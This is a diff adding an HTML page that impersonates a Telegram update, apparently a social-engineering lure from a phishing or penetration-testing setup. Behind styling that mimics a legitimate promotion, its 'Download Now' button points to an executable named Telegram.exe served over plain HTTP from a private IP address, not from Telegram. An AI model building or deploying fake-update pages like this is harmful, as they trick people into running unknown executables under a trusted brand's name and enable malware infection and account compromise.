@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Updated Telegram</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Raleway:wght@400;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body with animated gradient background */
+        body {
+            font-family: 'Raleway', sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #333;
+            position: relative;
+            background: linear-gradient(45deg, #4CAF50, #00bcd4, #f44336, #9c27b0); /* Animated gradient colors */
+            background-size: 600% 600%;
+            animation: gradientAnimation 15s ease infinite; /* Infinite animation */
+        }
+
+        @keyframes gradientAnimation {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        /* Overlay for better text visibility */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 1;
+        }
+
+        /* Container style (login form) */
+        .container {
+            background-color: rgba(255, 255, 255, 0.9); /* Semi-transparent white background */
+            border-radius: 15px;
+            padding: 30px;
+            width: 400px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            position: relative;
+            z-index: 2; /* Ensure content is above the overlay */
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        /* Hover effect for container */
+        .container:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Header and text styles */
+        h1 {
+            font-size: 2em;
+            margin-bottom: 10px;
+            color: #4CAF50;
+        }
+
+        p {
+            margin-bottom: 20px;
+            font-size: 1.1em;
+            color: #777;
+        }
+
+        /* Button styles */
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 10px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s ease-in-out;
+        }
+
+        button:hover {
+            background-color: #45a049;
+            transform: translateY(-5px);
+        }
+
+        /* Button click animation */
+        button:active {
+            transform: scale(0.98);
+        }
+
+        /* Fade-in animation on load */
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Overlay div -->
+    <div class="overlay"></div>
+
+    <!-- Main container for login form -->
+    <div class="container">
+        <h1>Welcome to Telegram</h1>
+        <p>Get the latest version with exciting new features!</p>
+        <a href="http://10.6.8.79/Telegram.exe">
+            <button>Download Now</button>
+        </a>
+    </div>
+
+</body>
+
+</html>
